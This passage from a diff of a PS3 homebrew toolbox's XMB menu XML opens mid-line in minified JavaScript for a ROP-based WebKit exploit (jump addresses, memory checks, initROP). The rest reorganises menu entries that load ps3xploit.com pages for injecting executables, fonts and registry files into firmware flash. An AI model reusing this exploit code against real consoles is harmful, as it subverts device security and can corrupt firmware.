eplaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\74search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\74search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(showTemps,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>			
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_database_rebuilder_offline"
+				attr="han_database_rebuilder_offline"
+				/>
 			<Query 
 				class="type:x-xmb/module-action"
 				key="han_flash_mounter_offline"
@@ -80,12 +126,6 @@
 				class="type:x-xmb/module-action"
 				key="han_temperature_reader_offline"
 				attr="han_temperature_reader_offline"
-				/>
-			<Query 
-				class="type:x-xmb/folder-pixmap" 
-				key="han_dex_settings_injector"
-				attr="han_dex_settings_injector" 				
-				src="#han_dex_settings_injector_items"
 				/>
 		</Items>
 	</View>
@@ -132,7 +172,7 @@
 		</Items>
 	</View>
 		
-<!-- Main Items > Advanced Tools > File Browser -->
+<!-- Main Items > Advanced Tools > File Operations > File Browser -->
 
 	<View id="han_file_browser_items">
 		<Attributes>
@@ -209,7 +249,7 @@
 		</Items>
 	</View>
 
-<!-- Main Items > Advanced Tools > File Browser > Internal Flash Memory -->
+<!-- Main Items > Advanced Tools > File Operations > File Browser > Internal Flash Memory -->
 	
 	<View id="han_browse_dev_flash_items">
 		<Attributes>
@@ -262,7 +302,7 @@
 		</Items>
 	</View>	
 	
-<!-- Main Items > Advanced Tools > File Browser > USB Mass Storage Devices -->
+<!-- Main Items > Advanced Tools > File Operations > File Browser > USB Mass Storage Devices -->
 	
 	<View id="han_browse_dev_usb_items">
 		<Attributes>
@@ -276,6 +316,12 @@
 				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/usb.png</String></Pair>
 				<Pair key="title_rsc"><String>han_toolbox_browse_dev_usb001</String></Pair>
 				<Pair key="info_rsc"><String>han_toolbox_browse_dev_usb001_info</String></Pair>
+				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
+			</Table>
+			<Table key="han_browse_dev_usb006">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/usb.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_browse_dev_usb006</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_browse_dev_usb006_info</String></Pair>
 				<Pair key="str_noitem"><String>msg_no_data</String></Pair>
 			</Table>
 		</Attributes>
@@ -292,31 +338,25 @@
 				attr="han_browse_dev_usb001" 			
 				src="host://localhost/dev_usb001"
 				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_browse_dev_usb006"
+				attr="han_browse_dev_usb006" 			
+				src="host://localhost/dev_usb006"
+				/>
 		</Items>
 	</View>
 	
-<!-- Main Items > Advanced Tools > File injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+<!-- Main Items > Advanced Tools > File Operations > File injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
 		
 	<View id="han_file_injector_items">
 		<Attributes>
-			<Table key="han_xreg_dumper_injector">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_debug.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_xreg_dumper_injector</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_xreg_dumper_injector_info</String></Pair>
-			</Table>
 			<Table key="han_inject_coldboot_raf">
 				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_coldboot.png</String></Pair>
 				<Pair key="title_rsc"><String>han_toolbox_inject_coldboot</String></Pair>
 				<Pair key="info_rsc"><String>han_toolbox_inject_coldboot_info</String></Pair>
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
 				<Pair key="module_action"><String>http://ps3xploit.com/hfw/coldboot/coldboot_installer.html</String></Pair>
-			</Table>
-			<Table key="han_inject_rco">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_rco.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_rco</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_rco_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_rco_replacer/flash_rco_replacer.html</String></Pair>
 			</Table>
 			<Table key="han_inject_gameboot">
 				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_rco.png</String></Pair>
@@ -325,29 +365,10 @@
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
 				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_rco_replacer/flash_rco_replacer.html</String></Pair>
 			</Table>
-			<Table key="han_inject_xml">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_xml.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_xml</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_xml_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_xml_replacer/flash_xml_replacer.html</String></Pair>
-			</Table>
-			<Table key="han_inject_self">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_info</String></Pair>
-			</Table>
-			<Table key="han_inject_sprx">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_sprx</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_sprx_info</String></Pair>
-			</Table>
-			<Table key="han_inject_lines">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_wave.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_lines</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_lines_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xmb_wave_installer/xmb_wave_installer.html</String></Pair>
+			<Table key="han_inject_font">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_font</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_font_info</String></Pair>
 			</Table>
 			<Table key="han_inject_imagefont">
 				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_emoji.png</String></Pair>
@@ -356,24 +377,49 @@
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
 				<Pair key="module_action"><String>http://ps3xploit.com/hfw/imagefont/imagefont_replacer.html</String></Pair>
 			</Table>
-			<Table key="han_inject_font">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_font.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_font</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_font_info</String></Pair>
+			<Table key="han_inject_rco">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_rco.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_rco</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_rco_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_rco_replacer/flash_rco_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_self">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_info</String></Pair>
+			</Table>
+			<Table key="han_inject_sprx">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_sprx</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_sprx_info</String></Pair>
 			</Table>
 			<Table key="han_inject_remove_cert">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_cert.png</String></Pair>
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
 				<Pair key="title_rsc"><String>han_toolbox_inject_remove_cert</String></Pair>
 				<Pair key="info_rsc"><String>han_toolbox_inject_remove_cert_info</String></Pair>
 			</Table>
+			<Table key="han_inject_lines">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_wave.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_lines</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_lines_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xmb_wave_installer/xmb_wave_installer.html</String></Pair>
+			</Table>
+			<Table key="han_inject_xml">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_xml.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_xml</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_xml_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_xml_replacer/flash_xml_replacer.html</String></Pair>
+			</Table>
+			<Table key="han_xreg_dumper_injector">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/folder.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_xreg_dumper_injector</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_xreg_dumper_injector_info</String></Pair>
+			</Table>
 		</Attributes>
 		<Items>
-			<Query 
-				class="type:x-xmb/folder-pixmap" 
-				key="han_xreg_dumper_injector"
-				attr="han_xreg_dumper_injector" 				
-				src="#han_xreg_dumper_injector_items"
-				/>
 			<Query 
 				class="type:x-xmb/module-action"
 				key="han_inject_coldboot_raf"
@@ -381,19 +427,25 @@
 				/>
 			<Query 
 				class="type:x-xmb/module-action"
-				key="han_inject_rco"
-				attr="han_inject_rco"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
 				key="han_inject_gameboot"
 				attr="han_inject_gameboot"
 				/>
 			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_xml"
-				attr="han_inject_xml"
+				class="type:x-xmb/folder-pixmap"
+				key="han_inject_font"
+				attr="han_inject_font"
+				src="#han_inject_font_items"
 				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_imagefont"
+				attr="han_inject_imagefont"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_rco"
+				attr="han_inject_rco"
+				/>				
 			<Query 
 				class="type:x-xmb/folder-pixmap" 
 				key="han_inject_self"
@@ -405,66 +457,135 @@
 				key="han_inject_sprx"
 				attr="han_inject_sprx"
 				src="#han_inject_sprx_items"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_lines"
-				attr="han_inject_lines"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_imagefont"
-				attr="han_inject_imagefont"
-				/>
-			<Query 
-				class="type:x-xmb/folder-pixmap"
-				key="han_inject_font"
-				attr="han_inject_font"
-				src="#han_inject_font_items"
-				/>
+				/>				
 			<Query 
 				class="type:x-xmb/folder-pixmap" 
 				key="han_inject_remove_cert"
 				attr="han_inject_remove_cert"
 				src="#han_inject_remove_cert_items"
 				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_lines"
+				attr="han_inject_lines"
+				/>				
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_xml"
+				attr="han_inject_xml"
+				/>
+			<Query 
+				class="type:x-xmb/folder-pixmap" 
+				key="han_xreg_dumper_injector"
+				attr="han_xreg_dumper_injector" 				
+				src="#han_xreg_dumper_injector_items"
+				/>
 		</Items>
 	</View>
 		
-<!-- Main Items > Advanced Tools > File injector > xRegistry Operations (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+<!-- Main Items > Advanced Tools > File Operations > File injector > Font TTF injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
 		
-	<View id="han_xreg_dumper_injector_items">
+	<View id="han_inject_font_items">
 		<Attributes>
-			<Table key="han_dump_xregistry">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/download.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_dump_xregistry</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_dump_xregistry_info</String></Pair>
+			<Table key="han_inject_TTF_font">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_font.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_TTF_font</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_TTF_font_info</String></Pair>
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xregistry_dumper_injector/xregistry_dumper.html</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_font_replacer/flash_font_replacer.html</String></Pair>
 			</Table>
-			<Table key="han_inject_xregistry">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_rco.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_xregistry</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_xregistry_info</String></Pair>
+			<Table key="han_inject_ttf_sony_cc_font">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_font.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_ttf_sony_cc_font</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_ttf_sony_cc_font_info</String></Pair>
 				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xregistry_dumper_injector/xregistry_injector.html</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_font_replacer/flash_font_replacer_sony_cc.html</String></Pair>
 			</Table>
 		</Attributes>
 		<Items>
 			<Query 
 				class="type:x-xmb/module-action"
-				key="han_dump_xregistry" 
-				attr="han_dump_xregistry"
+				key="han_inject_TTF_font" 
+				attr="han_inject_TTF_font"
 				/>
 			<Query 
 				class="type:x-xmb/module-action"
-				key="han_inject_xregistry" 
-				attr="han_inject_xregistry"
+				key="han_inject_ttf_sony_cc_font" 
+				attr="han_inject_ttf_sony_cc_font"
 				/>
 		</Items>
 	</View>
+		
+<!-- Main Items > Advanced Tools > File Operations > File injector > SELF injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+		
+	<View id="han_inject_self_items">
+		<Attributes>
+			<Table key="han_inject_self_bd">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self_bd</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_bd_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_bdplayer.html</String></Pair>
+			</Table>		
+			<Table key="han_inject_self_ps1">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self_ps1</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_ps1_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_ps1emu.html</String></Pair>
+			</Table>
+			<Table key="han_inject_self_ps2">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self_ps2</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_ps2_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_ps2emu.html</String></Pair>
+			</Table>
+			<Table key="han_inject_self_psp">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self_psp</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_psp_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_pspemu.html</String></Pair>
+			</Table>
+			<Table key="han_inject_self_main">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_self_main</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_self_main_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_vsh_module.html</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_self_bd"
+				attr="han_inject_self_bd"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_self_ps1"
+				attr="han_inject_self_ps1"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_self_ps2"
+				attr="han_inject_self_ps2"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_self_psp"
+				attr="han_inject_self_psp"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_self_main"
+				attr="han_inject_self_main"
+				/>				
+		</Items>
+	</View>
 
-<!-- Main Items > Advanced Tools > File injector > SPRX injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+<!-- Main Items > Advanced Tools > File Operations > File injector > SPRX injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
 		
 	<View id="han_inject_sprx_items">
 		<Attributes>
@@ -509,109 +630,7 @@
 		</Items>
 	</View>
 		
-<!-- Main Items > Advanced Tools > File injector > SELF injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
-		
-	<View id="han_inject_self_items">
-		<Attributes>
-			<Table key="han_inject_self_main">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self_main</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_main_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_vsh_module.html</String></Pair>
-			</Table>
-			<Table key="han_inject_self_ps1">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self_ps1</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_ps1_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_ps1emu.html</String></Pair>
-			</Table>
-			<Table key="han_inject_self_ps2">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self_ps2</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_ps2_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_ps2emu.html</String></Pair>
-			</Table>
-			<Table key="han_inject_self_psp">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_game.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self_psp</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_psp_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_pspemu.html</String></Pair>
-			</Table>
-			<Table key="han_inject_self_bd">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_executable.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_self_bd</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_self_bd_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_self_replacer/flash_self_replacer_bdplayer.html</String></Pair>
-			</Table>
-		</Attributes>
-		<Items>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_self_main"
-				attr="han_inject_self_main"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_self_ps1"
-				attr="han_inject_self_ps1"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_self_ps2"
-				attr="han_inject_self_ps2"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_self_psp"
-				attr="han_inject_self_psp"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_self_bd"
-				attr="han_inject_self_bd"
-				/>
-		</Items>
-	</View>
-
-<!-- Main Items > Advanced Tools > File injector > Font TTF injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
-		
-	<View id="han_inject_font_items">
-		<Attributes>
-			<Table key="han_inject_TTF_font">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_font.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_TTF_font</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_TTF_font_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_font_replacer/flash_font_replacer.html</String></Pair>
-			</Table>
-			<Table key="han_inject_ttf_sony_cc_font">
-				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_font.png</String></Pair>
-				<Pair key="title_rsc"><String>han_toolbox_inject_ttf_sony_cc_font</String></Pair>
-				<Pair key="info_rsc"><String>han_toolbox_inject_ttf_sony_cc_font_info</String></Pair>
-				<Pair key="module_name"><String>webrender_plugin</String></Pair>
-				<Pair key="module_action"><String>http://ps3xploit.com/hfw/flash_font_replacer/flash_font_replacer_sony_cc.html</String></Pair>
-			</Table>
-		</Attributes>
-		<Items>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_TTF_font" 
-				attr="han_inject_TTF_font"
-				/>
-			<Query 
-				class="type:x-xmb/module-action"
-				key="han_inject_ttf_sony_cc_font" 
-				attr="han_inject_ttf_sony_cc_font"
-				/>
-		</Items>
-	</View>
-		
-<!-- Main Items > Advanced Tools > File injector > Cert injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+<!-- Main Items > Advanced Tools > File Operations > File injector > Cert injector (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
 		
 	<View id="han_inject_remove_cert_items">
 		<Attributes>
@@ -640,6 +659,39 @@
 				class="type:x-xmb/module-action"
 				key="han_remove_cert"
 				attr="han_remove_cert"
+				/>
+		</Items>
+	</View>
+	
+<!-- Main Items > Advanced Tools > File Operations > File injector > xRegistry Operations (CEX/DEX 4.81 - 4.84 OFW/CFW/HFW Firmware) -->
+		
+	<View id="han_xreg_dumper_injector_items">
+		<Attributes>
+			<Table key="han_dump_xregistry">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/download.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_dump_xregistry</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_dump_xregistry_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xregistry_dumper_injector/xregistry_dumper.html</String></Pair>
+			</Table>
+			<Table key="han_inject_xregistry">
+				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/inj_rco.png</String></Pair>
+				<Pair key="title_rsc"><String>han_toolbox_inject_xregistry</String></Pair>
+				<Pair key="info_rsc"><String>han_toolbox_inject_xregistry_info</String></Pair>
+				<Pair key="module_name"><String>webrender_plugin</String></Pair>
+				<Pair key="module_action"><String>http://ps3xploit.com/hfw/xregistry_dumper_injector/xregistry_injector.html</String></Pair>
+			</Table>
+		</Attributes>
+		<Items>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_dump_xregistry" 
+				attr="han_dump_xregistry"
+				/>
+			<Query 
+				class="type:x-xmb/module-action"
+				key="han_inject_xregistry" 
+				attr="han_inject_xregistry"
 				/>
 		</Items>
 	</View>
